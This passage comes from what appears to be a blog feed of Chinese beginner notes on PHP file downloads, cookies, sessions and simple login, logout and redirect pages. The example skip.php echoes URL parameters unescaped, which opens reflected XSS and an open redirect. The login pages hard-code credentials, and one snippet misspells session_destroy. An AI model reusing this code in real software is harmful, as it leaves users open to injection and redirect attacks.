punctuation">(</span><span class="token punctuation">)</span>文件上传后，首先会储存于服务器的临时目录中，可以使用该函数将上传的文件移动到新位置</code></pre><h2 id="文件的下载"><a href="#文件的下载" class="headerlink" title="文件的下载"></a>文件的下载</h2><p>1.发送指定的文件MIME类型的头信息</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:MIME类型'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>2.指定下载文件的描述</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-Disposition:attachement;filename=文件名称'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>3.指定下载文件的大小</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-Length:文件大小'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>4.读取文件内容至输出缓冲区</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>关于<code>fileinfo</code>扩展。可以用来返回文件的MIME类型</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$fileinfo</span><span class="token operator">=</span><span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>打开资源，最后要记得用<code>fileinfo_close()</code>释放掉资源</p><h1 id="会话控制"><a href="#会话控制" class="headerlink" title="会话控制"></a>会话控制</h1><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>关于记录什么的，随时看随时学，只这一条链接就够了<br><a href="https://baike.baidu.com/item/cookie/1119?fr=aladdin">cookie百度百科</a><br><img src="https://img-blog.csdnimg.cn/20200418175239707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>1.向客户端电脑中设置cookie<br><code>setcookie()</code><br>2.在服务器端上读取cookie的内容<br><code>$_COOKIE</code><br>3.将多维数组应用于cookie中</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"member[name]"</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'j4y'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"member[email]"</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'123456789@qq.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>4.删除cookie</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"member"</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//时间单位是秒。</span><span class="token comment">//补充</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span>有第四个参数，设定有效存放路径“<span class="token operator">/</span>”表示web根目录，web下的所有目录有效。默认目录是当前目录。</code></pre><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>session技术与cookie相似，用来储存使用者的相关资料，但是最大的不同之处在于Cookie是将资料储存在客户端电脑中，而Session则是将数据存放在服务器上。<br><img src="https://img-blog.csdnimg.cn/20200419091832554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>1.开启session</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>开启一个会话，或者打开一个已存在的会话。<br>2.使用session存储数据</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'j4y'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'email'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'123456789@qq.com'</span><span class="token punctuation">;</span></code></pre><p>3.注销变量与销毁session</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打开要销毁的会话</span><span class="token function">session_unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//free all session variables</span><span class="token function">session_destory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//销毁一个会话中的全部数据</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token function">session_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//销毁保存在客户端的卡号（即session_id）</span><span class="token delimiter important">?></span></span></code></pre><h2 id="基于cookie和session的登录页面"><a href="#基于cookie和session的登录页面" class="headerlink" title="基于cookie和session的登录页面"></a>基于cookie和session的登录页面</h2><h3 id="基于cookie"><a href="#基于cookie" class="headerlink" title="基于cookie"></a>基于cookie</h3><pre class="language-php" data-language="php"><code class="language-php">//login.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'j4y'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Location:1.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//跳转到指定网页</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'cookie设置失败！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'对不起，登录失败，请检查您的用户名或者密码是否正确，注意密码安全，嘻嘻！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh-CN<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>请登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    姓名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>登录<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200419133339961.png" alt="Augenstern" loading="lazy"></p><h3 id="基于session"><a href="#基于session" class="headerlink" title="基于session"></a>基于session</h3><p>登录页面</p><pre class="language-php" data-language="php"><code class="language-php">//login.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'j4y'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'您已登录，请不要重复登录'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'j4y'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Location:skip.php?url=j4y.php&amp;info=登录成功，正在跳转中····'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'对不起，登录失败，请检查您的用户名或者密码是否正确，注意密码安全，嘻嘻！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh-CN<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>请登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    姓名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>登录<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>登录进去后显示的页面</p><pre class="language-php" data-language="php"><code class="language-php">//j4y.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'j4y'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"欢迎回来！"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;a href='logout.php'>注销&lt;/a>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;a href='login.php'>请登录&lt;/a>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>登出(注销)页面</p><pre class="language-php" data-language="php"><code class="language-php">//logout.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'j4y'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">session_unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token function">session_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3600</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Location:skip.php?url=j4y.php&amp;info=注销成功，正在跳转中···'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Location:skip.php?url=j4y.php&amp;info=注销失败，请您检查网络连接是否成功，并稍后再试！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>跳转页面</p><pre class="language-php" data-language="php"><code class="language-php">//skip.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'info'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh-CN<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3;URL=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'url'</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>正在跳转中···<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'info'</span><span class="token punctuation">]</span> <span class="token delimiter important">?></span></span>3秒后自动跳转！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>经过这次学习，学到了很多有趣的东西，虽然同样是我不喜欢的敲代码，但是不知道为什么，我自己学编程语言，会有点成就感，又学到了技能，感觉很充实。继续加油。<br>            <img src="https://img-blog.csdnimg.cn/20200419145951197.jpg" alt="Augenstern" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP从零开始——学习笔记(2)</title>
      <link href="/posts/b217470e/"/>
      <url>/posts/b217470e/</url>
      
        <content type="html"><![CDATA[<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h2><p>PHP支持可变函数的概念，就是说如果一个变量名后面有圆括号，PHP将寻找与变量的值同名的函数，并且尝试执行它。<br>可变函数代码示例：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">one</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"In one()\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">two</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"In two();argument was '<span class="token interpolation"><span class="token variable">$a</span></span>'\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//使用echo的包装函数</span><span class="token keyword">function</span> <span class="token function">three</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'one'</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'two'</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'three'</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>加上运行结果，回头复习更加容易理解。<br><img src="https://img-blog.csdnimg.cn/2020040709170730.png" alt="Augenstern" loading="lazy"></p><h2 id="内部（内置）函数"><a href="#内部（内置）函数" class="headerlink" title="内部（内置）函数"></a>内部（内置）函数</h2><p>PHP有很多标准的函数和结构，还有一些函数需要和特定的PHP扩展模块一起编译，否则在使用他们的时候，就会报错为“未定义函数”。<br>比如要使用<code>image</code>函数中的<code>imagecreatetruecolor()</code>，需要在编译PHP时加上适合的扩展模块。还有，要使用<code>mysql_connect()</code>函数，就需要在编译时加上<code>mysql</code>支持，</p><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" 